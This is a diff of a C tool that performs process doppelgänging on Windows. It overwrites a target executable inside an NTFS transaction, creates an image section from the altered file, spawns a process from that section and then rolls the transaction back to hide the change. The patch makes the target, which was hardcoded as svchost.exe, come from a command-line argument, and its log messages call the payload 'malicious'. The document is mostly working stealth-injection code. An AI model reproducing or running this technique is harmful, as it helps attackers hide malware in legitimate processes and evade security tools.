@@ -131,8 +131,12 @@ int main(int argc,char *argv[] )
 		return -1;
 	}
 	printf("[+] Got NtCreateSection at 0x%08p\n", createSection);
+	WCHAR temp[MAX_PATH] = { 0 };
+	char fileFullPath[MAX_PATH] = { 0 };
 
-	HANDLE hTransaction = CreateTransaction(NULL,0,0,0,0,0,L"svchost.exe");
+	GetFullPathName(argv[1], MAX_PATH, fileFullPath, NULL);
+	MultiByteToWideChar(CP_UTF8, 0, fileFullPath, strlen(fileFullPath), temp, MAX_PATH);
+	HANDLE hTransaction = CreateTransaction(NULL,0,0,0,0,0, temp);
 	if (INVALID_HANDLE_VALUE == hTransaction)
 	{
 		DisplayErrorText(GetLastError());
@@ -140,14 +144,14 @@ int main(int argc,char *argv[] )
 	}
 	printf("[+] Created a transaction, handle 0x%x\n", hTransaction);
 
-	HANDLE hTransactedFile = CreateFileTransacted("svchost.exe",
+	HANDLE hTransactedFile = CreateFileTransacted(fileFullPath,
 		GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL, hTransaction, NULL, NULL);
 	if (INVALID_HANDLE_VALUE == hTransactedFile)
 	{
 		DisplayErrorText(GetLastError());
 		return -1;
 	}
-	printf("[+] CreateFileTransacted on svchost, handle 0x%x\n", hTransactedFile);
+	printf("[+] CreateFileTransacted on %s, handle 0x%x\n", fileFullPath, hTransactedFile);
 
 	HANDLE hExe = CreateFile(argv[2],
 		 GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -189,7 +193,7 @@ int main(int argc,char *argv[] )
 		DisplayErrorText(GetLastError());
 		return -1;
 	}
-	printf("[+] over wrote svchost in transcation\n");
+	printf("[+] over wrote %s in transcation\n", fileFullPath);
 
 	ret = createSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hTransactedFile);
 	if(FALSE == NT_SUCCESS(ret))
@@ -197,7 +201,7 @@ int main(int argc,char *argv[] )
 		DisplayErrorText(GetLastError());
 		return -1;
 	}
-	printf("[+] created a section with our new malicious svchost\n");
+	printf("[+] created a section with our new malicious %s\n", fileFullPath);
 
 
 
@@ -211,11 +215,7 @@ int main(int argc,char *argv[] )
 
 	HANDLE hProcess=0;
 	my_RtlInitUnicodeString initUnicodeString = (my_RtlInitUnicodeString)GetProcAddress(hNtdll, "RtlInitUnicodeString");
-	WCHAR temp[MAX_PATH] = { 0 };
-	char temp2[MAX_PATH] = { 0 };
 
-	GetFullPathName(argv[1], MAX_PATH, temp2, NULL);
-	MultiByteToWideChar(CP_UTF8, 0, temp2, strlen(temp2), temp, MAX_PATH);
 	initUnicodeString(&string, temp);
 
 	ret = createProcessEx(&hProcess, GENERIC_ALL,NULL, GetCurrentProcess(), PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);
@@ -329,7 +329,7 @@ int main(int argc,char *argv[] )
 		DisplayErrorText(GetLastError());
 		return -1;
 	}
-	printf("[+] rolling back the original svchost\n");
+	printf("[+] rolling back the original %s\n", fileFullPath);
 
 	CloseHandle(hProcess);
 	CloseHandle(hExe);
